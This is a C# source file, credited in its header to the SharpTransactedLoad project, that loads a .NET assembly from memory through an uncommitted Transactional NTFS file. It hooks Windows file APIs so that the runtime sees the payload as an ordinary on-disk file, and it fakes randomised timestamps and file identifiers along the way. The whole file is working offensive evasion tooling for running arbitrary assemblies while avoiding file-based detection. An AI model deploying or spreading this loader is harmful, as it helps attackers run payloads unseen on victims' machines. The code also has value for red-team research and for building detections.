using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Domains
{

    /**
     * This code has been obtained from this amazing project: https://github.com/G0ldenGunSec/SharpTransactedLoad. 
     * I just adjusted it to fit it in my code, avoiding the dependency on EasyHook.
     * For more detailed information about this technique, consult the original blog post: https://blog.redxorblue.com/2021/05/assemblylie-using-transactional-ntfs.html
    **/
    public class TransactedAssembly
    {
        public static IntPtr createFileHandle;
        public static string loadedAssemblyName;
        public static byte[] assemblyBytes;
        public static byte[] attributeData = new byte[36];
        static bool attribDataSet = false;
        static int assemblyLength;

        public static Assembly Load(byte[] assemblyBytes, string assemblyName = "")
        {
            //we need to get the "real" name of the assembly we're attempting to load (the name it was compiled with),
            //as the CLR will check if the name embeded in the file it loads into memory matches the name of the file it originally searched for.
            //This info can either be provided by the operator as an optional arg, or dynamically pulled from the byte array at runtime.
            if (assemblyName == "")
            {
                loadedAssemblyName = ParseNetHeaderFromByteArray.ParseArray(assemblyBytes);
            }
            else
            {
                loadedAssemblyName = assemblyName;

                Console.WriteLine("[*] Parsing skipped, using {0} as assembly name", loadedAssemblyName);

            }

            Console.WriteLine("\r\n[*] Kicking off assembly load process");

            IntPtr UOW = IntPtr.Zero;
            IntPtr lpTransactionAttributes = IntPtr.Zero;
            int CreateOptions = 0;
            int IsolationLevel = 0;
            int IsolationFlags = 0;
            int Timeout = 0;
            Random rand = new Random();
            StringBuilder Description = new StringBuilder(getRandomName(rand));
            ushort miniVersion = 0xffff;
            IntPtr transactionHandle = IntPtr.Zero;
            //Create a transaction, pass the transaction handle to CreateFileTransacted
            try
            {
                transactionHandle = API.CreateTransaction(lpTransactionAttributes, UOW, CreateOptions, IsolationLevel, IsolationFlags, Timeout, Description);

                Console.WriteLine("    --Transaction created");
                Console.WriteLine("      |-> Name: " + Description.ToString());
                Console.WriteLine("      |-> Handle: " + transactionHandle.ToString());

                //this can be named anything, it never is written through to disk and is cleared upon exiting the Load() method. Only req is that it is a valid filepath the current user has write privs to.
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                path = path + string.Format(@"\{0}.log", getRandomName(rand));
                createFileHandle = API.CreateFileTransactedW(path, 0x80000000 | 0x40000000, 0x00000002, IntPtr.Zero, 0x00000001, 0x100 | 0x04000000, IntPtr.Zero, transactionHandle, ref miniVersion, IntPtr.Zero);

                Console.WriteLine("    --Transacted file created");
                Console.WriteLine("      |-> Name: " + path);
                Console.WriteLine("      |-> Handle: " + createFileHandle.ToString());

                if (createFileHandle.ToInt32() == -1)
                {
                    throw new ArgumentException("Error - Invalid handle returned by CreateFileTransacted call");
                }
                uint bytesWritten = 0;
                assemblyLength = assemblyBytes.Length;
                bool written = API.WriteFile(createFileHandle, assemblyBytes, (uint)assemblyBytes.Length, out bytesWritten, IntPtr.Zero);

                Console.WriteLine("    --Bytes written to transacted file: " + bytesWritten);

            }
            catch
            {

                Console.WriteLine("[X] Error creating transaction - ensure folder path exists and you have write privs to it");

                return null;
            }



            HookManager hm = new HookManager();
            hm.Install(); //Add hooks

            Assembly a = null;
            try
            {
                a = Assembly.Load(loadedAssemblyName.Substring(0, loadedAssemblyName.Length - 4));
            }
            catch
            {
                Console.WriteLine("[X] Error running hooked Assembly.Load. Ensure you're building as x64 and that loaded assembly name is correct, otherwise may be some funny business messing with our hooks (debugger etc.)");
            }

            try
            {
                hm.Uninstall(); //Remove hooks

                //Per MS -- "If the last transaction handle is closed before a client calls the CommitTransaction function with the transaction handle, then KTM rolls back the transaction"
                //this means we shouldn't have to manually delete the transaction with RollbackTransaction()
                API.CloseHandle(createFileHandle);
                API.CloseHandle(transactionHandle);

                Console.WriteLine("[*] Cleaned up handles and hooks");
            }
            catch
            {
                Console.WriteLine("[X] Error Closing handles and cleaning hooks");
            }


            if (a != null)
            {
                Console.WriteLine("[+] Successfully loaded assembly, passing object back to caller");
            }
            return a;

        }

        static private string getRandomName(Random rand)
        {
            string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            char[] stringChars = new char[8];
            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = seedVals[rand.Next(seedVals.Length)];
            }
            return new string(stringChars);
        }

        //hooks redirect to the below functions
        static public uint GetFileAttributesWDetour(IntPtr lpFileName)
        {
            string fileName = Marshal.PtrToStringUni(lpFileName);
            if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("[*] Intercepted hooked GetFileAttributes call for our assembly");
                //32 == FILE_ATTRIBUTE_ARCHIVE  -- default value returned when Assembly.Load() is ran with an on-disk assembly
                return 32;
            }
            else
            {
                return API.GetFileAttributesW(lpFileName);
            }
        }

        static public bool GetFileAttributesExWDetour(IntPtr lpFileName, uint fInfoLevelId, IntPtr lpFileInformation)
        {
            string fileName = Marshal.PtrToStringUni(lpFileName);
            if (fileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("[*] Intercepted hooked GetFileAttributesEx call for our assembly");
                //builds a byte array that represents a WIN32_FILE_ATTRIBUTE_DATA structure.  Will only build it once as this call is made twice in an Assembly.Load() call
                if (!attribDataSet)
                {
                    Random a = new Random();
                    DateTime creationTime = DateTime.Now.AddSeconds(a.Next(604800) * -1);
                    BitConverter.GetBytes(0x00000020).CopyTo(attributeData, 0);
                    BitConverter.GetBytes(creationTime.ToFileTime()).CopyTo(attributeData, 4);
                    TimeSpan t = DateTime.Now - creationTime;
                    DateTime writeTime = creationTime.AddSeconds(a.Next((int)t.TotalSeconds));
                    BitConverter.GetBytes(writeTime.ToFileTime()).CopyTo(attributeData, 20);
                    t = DateTime.Now - writeTime;
                    DateTime modifiedTime = writeTime.AddSeconds(a.Next((int)t.TotalSeconds));
                    BitConverter.GetBytes(modifiedTime.ToFileTime()).CopyTo(attributeData, 12);
                    BitConverter.GetBytes(0x00000000).CopyTo(attributeData, 28);
                    BitConverter.GetBytes(assemblyLength).CopyTo(attributeData, 32);
                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                    attribDataSet = true;
                    return true;
                }
                else
                {
                    Marshal.Copy(attributeData, 0, lpFileInformation, 36);
                    return true;
                }
            }
            return API.GetFileAttributesExW(lpFileName, fInfoLevelId, lpFileInformation);
        }

        static public IntPtr CreateFileWDetour([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile)
        {
            if (lpFileName.EndsWith(loadedAssemblyName, StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("[*] Intercepted hooked CreateFileW call for our assembly");
                //if a request is made for the nonexistent assembly we're attempting to load, we return a handle to our memory-only transacted file
                return createFileHandle;
            }
            IntPtr fileHandle = API.CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
            return fileHandle;
        }

        static public bool GetFileInformationByHandleDetour(IntPtr hFile, IntPtr lpFileInformation)
        {
            if (hFile == createFileHandle)
            {
                Console.WriteLine("[*] Intercepted hooked GetFileInformationByHandle for our assembly");
                //builds a byte array that represents a BY_HANDLE_FILE_INFORMATION struct and writes it to the lpFileInformation pointer
                //contains the same information first provided in the GetFileAttributesExW call as the CLR compares these to ensure it has a handle to the correct file
                byte[] handleFileInfoData = new byte[52];
                Buffer.BlockCopy(attributeData, 0, handleFileInfoData, 0, 28);
                Random byteGenerator = new Random();
                byte[] serialNumber = new byte[4];
                byte[] fileFingerprint = new byte[8];
                byteGenerator.NextBytes(serialNumber);
                byteGenerator.NextBytes(fileFingerprint);
                //probably unecessary to swap these back to 0
                fileFingerprint[0] = 0x00;
                fileFingerprint[1] = 0x00;
                Array.Copy(serialNumber, 0, handleFileInfoData, 28, 4);
                Buffer.BlockCopy(attributeData, 28, handleFileInfoData, 32, 8);
                BitConverter.GetBytes(0x01).CopyTo(handleFileInfoData, 40);
                Array.Copy(fileFingerprint, 0, handleFileInfoData, 44, 8);
                Marshal.Copy(handleFileInfoData, 0, lpFileInformation, 52);
                return true;
            }
            return API.GetFileInformationByHandle(hFile, lpFileInformation);
        }

    }
}
